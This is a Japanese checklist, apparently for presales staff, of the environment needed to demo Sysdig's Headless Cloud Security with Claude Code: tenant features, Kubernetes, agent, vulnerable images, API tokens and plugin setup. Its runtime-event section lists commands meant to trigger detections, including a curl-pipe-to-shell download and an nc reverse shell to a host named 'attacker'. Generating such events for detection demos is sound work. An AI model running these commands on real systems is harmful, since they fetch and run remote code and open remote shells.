# Headless Sysdig デモに必要な環境一覧

顧客向けデモを安定して実施するなら、最低限これを揃えるとかなり安全です。

---

## 1. 必須アカウント

### ① Sysdig Secure テナント

最重要です。

必要機能:
- CSPM
- Vulnerability Management
- Runtime Security
- Inventory
- SysQL

#### 推奨状態

| 項目 | 推奨 |
|------|------|
| Runtime Eventあり | 必須 |
| Kubernetes接続済み | 必須 |
| Vulnerability検出済み | 必須 |
| Cloud接続済み | あると強い |
| Runtime Policies有効 | 推奨 |

---

## 2. Kubernetes環境

### 推奨

#### 一番ラク
- kind
- minikube

#### 顧客向けなら強い
- EKS

理由:
- 現実感がある
- Runtime説明しやすい
- Cloud Context出せる

---

## 3. Sysdig Agent

### 必須

Host Shield / Agent — Runtimeを出すため。

### 必要なもの
- Falco Event
- Process情報
- Container Metadata
- Kubernetes Metadata

---

## 4. 脆弱コンテナ

### 必須

Headlessの価値は:
- Runtime
- Vulnerability
- Context Correlation

なので、脆弱イメージが必要。

### 超おすすめ

```yaml
nginx:1.16
```

または `vulhub` 系。

---

## 5. Runtime Event生成環境

### 超重要

これが無いと Sysdig の差別化が死にます。

### 推奨イベント

#### curl | bash

```bash
curl http://test/payload.sh | sh
```

#### tmp execution

```bash
chmod +x /tmp/test.sh
/tmp/test.sh
```

#### nc reverse shell

```bash
nc -e /bin/sh attacker 4444
```

---

## 6. AI Agent

ここが Headless の主役。

### 公式サポート: Claude Code のみ

Public Beta 時点で Sysdig が公式サポートしている AI ランタイムは **Claude Code** のみ。
他の MCP 互換 Agent (Cursor / VSCode Agent 等) は理論上動くが launch 時点で非サポート。

### 必要なもの

- Claude Code 本体
- Anthropic アカウント
- ターミナル (zsh/bash)

---

## 7. Headless Cloud Security プラグイン

これが Headless のコア。Claude Code に Sysdig 公式の Skills プラグインを入れる。

### 必要

- API Token (Sysdig UI → Settings → Sysdig API)
- 環境変数:
  - `SYSDIG_SECURE_URL` (例: `https://us2.app.sysdig.com`)
  - `SYSDIG_SECURE_API_TOKEN`
- Python 3 (stdlib のみ使用)

### 導入

```
/plugin marketplace add sysdig/skills
/plugin install headless-cloud-security@sysdig-skills
```

### 提供される Skill (5つ)

| Skill | 用途 |
|-------|------|
| `sysdig-investigate` | Vulnerability 調査・優先順位付け |
| `sysdig-runtime-investigate` | Falco runtime threat 分析 |
| `sysdig-remediate` | 脆弱イメージ修正・PR/MR 作成 |
| `sysdig-onboarding` | AWS / K8s onboarding |
| `sysdig-posture` | Posture policy (Rego) 作成 |

### 前提条件

Sysdig Sage が **テナント側で有効化されていること** (Public Beta の制約)。

### 参考

- https://github.com/sysdig/skills
- https://www.sysdig.com/blog/introducing-headless-cloud-security

---

## 8. API Token

### 必須

最低: Read権限

### 推奨

- Runtime
- Inventory
- Vulnerability
- Posture

全部。

---

## 9. デモ用 Namespace

### 必須

固定する。

### 推奨

- `production`
- `payments`
- `demo`

---

## 10. 事前生成データ

### 超重要

#### 必須

- **Vulnerability**: 事前スキャン済み
- **Runtime Event**: 最低3〜5件
- **Inventory**: Pod/Workloadが見えている

---

## 11. ネットワーク

意外と事故る。

### 必須

| 項目 | 内容 |
|------|------|
| Internet | 必須 |
| Anthropic / Claude Code | 必須 |
| Sysdig SaaS | 必須 |
| GitHub (sysdig/skills 取得) | 必須 |

---

## 12. デモマシン

### 推奨

Mac。

理由:
- Claude Code 安定
- Terminal映え
- Kubernetesやりやすい

---

## 13. 推奨構成 (現実解)

### 最強に安定

| 要素 | 推奨 |
|------|------|
| Cloud | GCP (or AWS) |
| K8s | GKE Standard (or EKS) |
| Runtime | Sysdig Agent |
| AI | Claude Code + sysdig-skills プラグイン |
| Demo | 事前仕込み |
| UI | 最小限 |
| Namespace | fixed |
| Runtime Event | pre-generated |

---

## 14. あると超強いもの

### CloudTrail連携

AIが:
- IAM
- Role
- Exposure

まで見れる。

### CI/CD

GitHub Actions。すると「PR remediation」まで見せられる。

---

## 15. 最小構成 (まず動かすだけ)

### 最低限これ

| 必要 | 内容 |
|------|------|
| Sysdig Secure (Sage 有効) | 1 |
| Kubernetes | 1 |
| Agent | 1 |
| Vulnerable container | 1 |
| Runtime Event | 1 |
| Claude Code | 1 |
| API Token | 1 |

これだけでデモは成立します。

---

## 16. まず最初にやるべき順番

| Step | 内容 |
|------|------|
| Step 1 | Sysdig Secure テナント確認 (リージョン + Sage 有効化) |
| Step 2 | Kubernetes接続 |
| Step 3 | Runtime Event発生確認 |
| Step 4 | 脆弱性表示確認 |
| Step 5 | API Token 発行 |
| Step 6 | Claude Code + sysdig-skills プラグイン導入 |
| Step 7 | AI Query 動作確認 |

---

## 17. 一番重要

> **デモは「リアルタイム」より「再現性」です。**

だから:
- Event事前生成
- Namespace固定
- Query固定
- 結果確認済み

にしてください。これで成功率が激増します。
